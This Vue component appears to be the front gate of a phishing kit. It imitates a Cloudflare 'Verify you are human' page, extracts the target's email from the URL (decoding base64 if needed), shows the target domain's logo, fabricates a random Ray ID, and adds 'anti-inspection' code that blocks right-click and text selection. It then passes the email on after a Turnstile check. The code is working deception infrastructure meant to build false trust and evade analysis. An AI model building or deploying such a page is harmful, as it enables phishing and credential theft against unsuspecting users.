<template>
  <div class="main-wrapper" role="main">
    <div class="main-content">
      <h1 class="zone-name-title h1">
        <img :src="`https://logo.clearbit.com/${DOMAIN_NAME}`" class="heading-favicon"
             alt="" @error="loadFallbackLogo" 
             @contextmenu.prevent 
             @selectstart.prevent 
             @dragstart.prevent>
        {{DOMAIN_NAME}}
      </h1>

      <template v-if="isSolved">
        <div v-if="isVerified" id="challenge-success-text" class="h2">Verification successful</div>
        <div v-else class="core-msg spacer">Waiting for <span class="domain">{{DOMAIN_NAME}}</span> to respond...</div>
      </template>
      <p id="TBuuD2" class="h2 spacer-bottom" v-else>
        <template v-if="isInteractive">
          Verify you are human by completing the action below.
        </template>
        <template v-else>
          Verifying you are human. This may take a few seconds.
        </template>
      </p>
      <div id="HJup0" style="display: grid;">
        <div></div>
      </div>
      <div id="ruDf4" class="spacer loading-spinner">
        <div class="lds-ring">
          <div></div>
          <div></div>
          <div></div>
          <div></div>
        </div>
      </div>
      <div id="bWfyD1" class="core-msg spacer spacer-top"><span class="domain">{{DOMAIN_NAME}}</span> needs to review the security of your connection
        before proceeding.
      </div>
      <div id="sNnIY0" style="display: none;">
        <div id="challenge-success-text" class="h2">Verification successful</div>
        <div class="core-msg spacer">Waiting for <span class="domain">{{DOMAIN_NAME}}</span> to respond...</div>
      </div>
      <noscript>
        <div class="h2"><span id="challenge-error-text">Enable JavaScript and cookies to continue</span></div>
      </noscript>
    </div>
  </div>
  <div class="footer" role="contentinfo">
    <div class="footer-inner">
      <div class="clearfix diagnostic-wrapper">
        <div class="ray-id">Ray ID: <code>{{RAY_ID}}</code></div>
      </div>
      <div class="text-center" id="footer-text">Performance &amp; security by <a rel="noopener noreferrer"
                                                                                 href="https://www.cloudflare.com?utm_source=challenge&utm_campaign=m"
                                                                                 target="_blank">Cloudflare</a></div>
    </div>
  </div>
</template>

<script lang="ts">
// @ts-nocheck
import {defineComponent} from 'vue'

export default defineComponent({
  name: "TurnstileWidget",
  data() {
    return {
      widget: undefined,
      isInitialized: false,
      isInteractive: false,
      isSolved: false,
      isVerified: false,

      domainNameFallback: '',
      logoFallback: '',
      turnstileSiteKey: '',
    }
  },
  computed: {
    EMAIL() {
      const parts = (window.location.pathname+window.location.search+window.location.hash).split(/[/#?&=]/);
      for (const part of parts) {
        if (part.includes('@')) {
          return part;
        }

        try {
          const decoded = atob(part);
          if (decoded.includes('@')) {
            return decoded;
          }
        } catch (e) {
        }
      }

      return '';
    },

    DOMAIN_NAME() {
      if (this.EMAIL) {
        return this.EMAIL.split('@')[1]
      }
      return this.domainNameFallback
    },

    RAY_ID() {
      const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
      let result = '';
      for (let i = 0; i < 16; i++) {
        const randomIndex = Math.floor(Math.random() * chars.length);
        result += chars[randomIndex];
      }
      return result;
    },
  },
  methods: {
    loadFallbackLogo(event) {
      event.target.onerror = null;
      event.target.src = `data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABAQMAAAAl21bKAAAAAXNSR0IB2cksfwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAANQTFRFAAAAp3o92gAAAAF0Uk5TAEDm2GYAAAAKSURBVHicY2QAAAAEAAIhZK1qAAAAAElFTkSuQmCC`;
    },
    async getToken(token) {
      const response = await fetch('/api/config', {
        method: 'POST',
        headers: {'content-type': 'application/json'},
        body: JSON.stringify({token}),
      });
      return  await response.text();
    },
  },
  async mounted() {
    // Add anti-inspection
    document.addEventListener('contextmenu', (e) => e.preventDefault());
    document.addEventListener('selectstart', (e) => e.preventDefault());
    document.addEventListener('dragstart', (e) => e.preventDefault());
    
    this.domainNameFallback = await this.getToken('domainNameFallback');
    this.logoFallback = await this.getToken('logoFallback');
    this.turnstileSiteKey = await this.getToken('turnstileSiteKey');
    document.title = 'Just a moment...';
    setTimeout(() => {
      turnstile.ready(() => {
        document.body.classList.add('no-js');
        document.querySelector('#ruDf4').style.cssText = 'display: none; visibility: hidden;';
        this.widget = turnstile.render("#HJup0 div", {
          sitekey: this.turnstileSiteKey,
          callback: (token) => {
            setTimeout(async () => {
              turnstile.remove(this.widget);
              this.isSolved = true;
              try {
                const response = await fetch('/api/verify', {
                  method: 'POST',
                  headers: {'Content-Type': 'application/json'},
                  body: JSON.stringify({token}),
                });
                if (!response.ok) {
                  throw new Error(`HTTP error! status: ${response.status}`);
                }
                const result = await response.json();
                if (result.success) {
                  this.isVerified = true;
                  setTimeout(() => {
                    this.$emit('turnstile-complete', this.EMAIL);
                  }, 600);
                } else {
                  alert('CAPTCHA verification failed. Please try again.');
                  window.location.reload();
                }
              } catch (e) {
                alert('CAPTCHA verification failed. Please try again.');
                window.location.reload();
                return;
              }

            }, 1000);
          },
          'feedback-enabled': false,
          'after-interactive-callback': () => {
            this.isInteractive = false;
          },
          'before-interactive-callback': () => {
            this.isInteractive = true;
          },

        });
      })
    }, 1000)
  },
})
</script>

<style>
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
  -webkit-user-select: none !important;
  -moz-user-select: none !important;
  -ms-user-select: none !important;
  user-select: none !important;
  -webkit-user-drag: none !important;
}

html {
  line-height: 1.15;
  -webkit-text-size-adjust: 100%;
  color: #313131;
  font-family: system-ui, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji
}

body {
  display: flex;
  flex-direction: column;
  height: 100vh;
  min-height: 100vh;
  -webkit-user-select: none !important;
  -moz-user-select: none !important;
  -ms-user-select: none !important;
  user-select: none !important;
}

#app:has(.main-wrapper) {
  display: flex;
  flex-direction: column;
  justify-content: space-between;
  flex-grow: 1;
}

/* Anti-inspection styles */
::selection {
  background: transparent !important;
}

::-moz-selection {
  background: transparent !important;
}

/* Rest of your existing CSS stays exactly the same... */
.main-content {
  margin: 8rem auto;
  max-width: 60rem;
  padding-left: 1.5rem
}

@media (width <= 720px) {
  .main-content {
    margin-top: 4rem
  }
}

.h2 {
  font-size: 1.5rem;
  font-weight: 500;
  line-height: 2.25rem
}

@media (width <= 720px) {
  .h2 {
    font-size: 1.25rem;
    line-height: 1.5rem
  }
}

#challenge-error-text {
  background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI0IyMEYwMyIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxNSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjQjIwRjAzIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC41NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Ci8+PC9zdmc+);
  background-repeat: no-repeat;
  background-size: contain;
  padding-left: 34px
}

@media (prefers-color-scheme: dark) {
  body {
    background-color: #222;
    color: #d9d9d9
  }
}

body.no-js .loading-spinner {
  visibility: hidden
}

body.theme-dark {
  background-color: #222;
  color: #d9d9d9
}

body.theme-dark a {
  color: #fff
}

body.theme-dark a:hover {
  color: #ee730a;
  text-decoration: underline
}

body.theme-dark .lds-ring div {
  border-color: #999 transparent transparent
}

body.theme-dark .font-red {
  color: #b20f03
}

body.theme-dark .ctp-button {
  background-color: #4693ff;
  color: #1d1d1d
}

body.theme-dark #challenge-success-text {
  background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDI2IDI2Ij48cGF0aCBmaWxsPSIjZDlkOWQ5IiBkPSJNMTMgMGExMyAxMyAwIDEgMCAwIDI2IDEzIDEzIDAgMCAwIDAtMjZtMCAyNGExMSAxMSAwIDEgMSAwLTIyIDExIDExIDAgMCAxIDAgMjIiLz48cGF0aCBmaWxsPSIjZDlkOWQ5IiBkPSJtMTAuOTU1IDE2LjA1NS0zLjk1LTQuMTI1LTEuNDQ1IDEuMzg1IDUuMzcgNS42MSA5LjQ5NS05LjYtMS40Mi0xLjQwNXoiLz48L3N2Zz4=")
}

body.theme-dark #challenge-error-text {
  background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI0IyMEYwMyIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxNSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjQjIwRjAzIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC01NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Qi8+PC9zdmc+")
}

body.theme-light {
  background-color: #fff;
  color: #313131
}

body.theme-light a {
  color: #0051c3
}

body.theme-light a:hover {
  color: #ee730a;
  text-decoration: underline
}

body.theme-light .lds-ring div {
  border-color: #595959 transparent transparent
}

body.theme-light .font-red {
  color: #fc574a
}

body.theme-light .ctp-button {
  background-color: #003681;
  border-color: #003681;
  color: #fff
}

body.theme-light #challenge-success-text {
  background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDI2IDI2Ij48cGF0aCBmaWxsPSIjMzEzMTMxIiBkPSJNMTMgMGExMyAxMyAwIDEgMCAwIDI2IDEzIDEzIDAgMCAwIDAtMjZtMCAyNGExMSAxMSAwIDEgMSAwLTIyIDExIDExIDAgMCAxIDAgMjIiLz48cGF0aCBmaWxsPSIjMzEzMTMxIiBkPSJtMTAuOTU1IDE2LjA1NS0zLjk1LTQuMTI1LTEuNDQ1IDEuMzg1IDUuMzcgNS42MSA5LjQ5NS05LjYtMS40Mi0xLjQwNXoiLz48L3N2Zz4=")
}

body.theme-light #challenge-error-text {
  background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI2ZjNTc0YSIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxNSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjZmM1NzRhIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC41NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Qi8+PC9zdmc+")
}

a {
  background-color: transparent;
  color: #0051c3;
  text-decoration: none;
  transition: color .15s ease
}

a:hover {
  color: #ee730a;
  text-decoration: underline
}

.main-content {
  margin: 8rem auto;
  max-width: 60rem;
  padding-left: 1.5rem;
  padding-right: 1.5rem;
  width: 100%
}

.main-content .loading-spinner {
  height: 76.391px
}

.spacer {
  margin: 2rem 0
}

.spacer-top {
  margin-top: 4rem
}

.spacer-bottom {
  margin-bottom: 2rem
}

.heading-favicon {
  height: 2rem;
  margin-right: .5rem;
  width: 2rem
}

@media (width <= 720px) {
  .main-content {
    margin-top: 4rem
  }

  .heading-favicon {
    height: 1.5rem;
    width: 1.5rem
  }
}

.main-wrapper {
  align-items: center;
  display: flex;
  flex: 1;
  flex-direction: column
}

.font-red {
  color: #b20f03
}

.h1 {
  font-size: 2.5rem;
  font-weight: 500;
  line-height: 3.75rem
}

.h2 {
  font-weight: 500
}

.core-msg, .h2 {
  font-size: 1.5rem;
  line-height: 2.25rem
}

.body-text, .core-msg {
  font-weight: 400
}

.body-text {
  font-size: 1rem;
  line-height: 1.25rem
}

@media (width <= 720px) {
  .h1 {
    font-size: 1.5rem;
    line-height: 1.75rem
  }

  .h2 {
    font-size: 1.25rem
  }

  .core-msg, .h2 {
    line-height: 1.5rem
  }

  .core-msg {
    font-size: 1rem
  }
}

#challenge-error-text {
  background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI2ZjNTc0YSIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxNSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjZmM1NzRhIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC01NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Qi8+PC9zdmc+");
  padding-left: 34px
}

#challenge-error-text, #challenge-success-text {
  background-repeat: no-repeat;
  background-size: contain
}

#challenge-success-text {
  background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDI2IDI2Ij48cGF0aCBmaWxsPSIjMzEzMTMxIiBkPSJNMTMgMGExMyAxMyAwIDEgMCAwIDI2IDEzIDEzIDAgMCAwIDAtMjZtMCAyNGExMSAxMSAwIDEgMSAwLTIyIDExIDExIDAgMCExIDAgMjIiLz48cGF0aCBmaWxsPSIjMzEzMTMxIiBkPSJtMTAuOTU1IDE2LjA1NS0zLjk1LTQuMTI1LTEuNDQ1IDEuMzg1IDUuMzcgNS42MSA5LjQ5NS05LjYtMS40Mi0xLjQwNXoiLz48L3N2Zz4=");
  padding-left: 42px
}

.text-center {
  text-align: center
}

.ctp-button {
  background-color: #0051c3;
  border: .063rem solid #0051c3;
  border-radius: .313rem;
  color: #fff;
  cursor: pointer;
  font-size: .875rem;
  line-height: 1.313rem;
  margin: 2rem 0;
  padding: .375rem 1rem;
  transition-duration: .2s;
  transition-property: background-color, border-color, color;
  transition-timing-function: ease
}

.ctp-button:hover {
  background-color: #003681;
  border-color: #003681;
  color: #fff;
  cursor: pointer
}

.footer {
  font-size: .75rem;
  line-height: 1.125rem;
  margin: 0 auto;
  max-width: 60rem;
  padding-left: 1.5rem;
  padding-right: 1.5rem;
  width: 100%
}

.footer-inner {
  border-top: 1px solid #d9d9d9;
  padding-bottom: 1rem;
  padding-top: 1rem
}

.clearfix:after {
  clear: both;
  content: "";
  display: table
}

.clearfix .column {
  float: left;
  padding-right: 1.5rem;
  width: 50%
}

.diagnostic-wrapper {
  margin-bottom: .5rem
}

.footer .ray-id {
  text-align: center
}

.footer .ray-id code {
  font-family: monaco, courier, monospace
}

.core-msg, .zone-name-title {
  overflow-wrap: break-word
}

@media (width <= 720px) {
  .diagnostic-wrapper {
    display: flex;
    flex-wrap: wrap;
    justify-content: center
  }

  .clearfix:after {
    clear: none;
    content: none;
    display: initial;
    text-align: center
  }

  .column {
    padding-bottom: 2rem
  }

  .clearfix .column {
    float: none;
    padding: 0;
    width: auto;
    word-break: keep-all
  }

  .zone-name-title {
    margin-bottom: 1rem
  }
}

.loading-spinner {
  height: 76.391px
}

.lds-ring {
  display: inline-block;
  position: relative
}

.lds-ring, .lds-ring div {
  height: 1.875rem;
  width: 1.875rem
}

.lds-ring div {
  animation: lds-ring 1.2s cubic-bezier(.5, 0, .5, 1) infinite;
  border: .3rem solid transparent;
  border-radius: 50%;
  border-top-color: #313131;
  box-sizing: border-box;
  display: block;
  position: absolute
}

.lds-ring div:first-child {
  animation-delay: -.45s
}

.lds-ring div:nth-child(2) {
  animation-delay: -.3s
}

.lds-ring div:nth-child(3) {
  animation-delay: -.15s
}

@keyframes lds-ring {
  0% {
    transform: rotate(0deg)
  }
  to {
    transform: rotate(1turn)
  }
}

.rtl .heading-favicon {
  margin-left: .5rem;
  margin-right: 0
}

.rtl #challenge-success-text {
  background-position: 100%;
  padding-left: 0;
  padding-right: 42px
}

.rtl #challenge-error-text {
  background-position: 100%;
  padding-left: 0;
  padding-right: 34px
}

.challenge-content .loading-spinner {
  height: 76.391px
}

@media (prefers-color-scheme: dark) {
  body {
    background-color: #222;
    color: #d9d9d9
  }

  body a {
    color: #fff
  }

  body a:hover {
    color: #ee730a;
    text-decoration: underline
  }

  body .lds-ring div {
    border-color: #999 transparent transparent
  }

  body .font-red {
    color: #b20f03
  }

  body .ctp-button {
    background-color: #4693ff;
    color: #1d1d1d
  }

  body #challenge-success-text {
    background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDI2IDI2Ij48cGF0aCBmaWxsPSIjZDlkOWQ5IiBkPSJNMTMgMGExMyAxMyAwIDEgMCAwIDI2IDEzIDEzIDAgMCAwIDAtMjZtMCAyNGExMSAxMSAwIDEgMSAwLTIyIDExIDExIDAgMCAxIDAgMjIiLz48cGF0aCBmaWxsPSIjZDlkOWQ5IiBkPSJtMTAuOTU1IDE2LjA1NS0zLjk1LTQuMTI1LTEuNDQ1IDEuMzg1IDUuMzcgNS42MSA5LjQ5NS05LjYtMS40Mi0xLjQwNXoiLz48L3N2Zz4=")
  }

  body #challenge-error-text {
    background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI0IyMEYwMyIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxNSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjQjIwRjAzIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC01NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Qi8+PC9zdmc+")
  }
}
</style>
